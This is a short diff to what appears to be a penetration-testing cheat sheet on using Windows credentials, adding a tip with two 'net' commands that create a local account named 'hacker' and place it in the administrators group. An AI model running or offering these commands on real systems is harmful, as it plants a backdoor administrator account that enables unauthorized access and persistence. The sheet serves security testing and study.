@@ -1,4 +1,10 @@
 # Windows - Using credentials
+Little tip, if you don't have credentials yet :D
+```
+net user hacker hacker /add
+net localgroup administrators hacker /add
+```
+
 
 ## Metasploit - SMB
 ```c
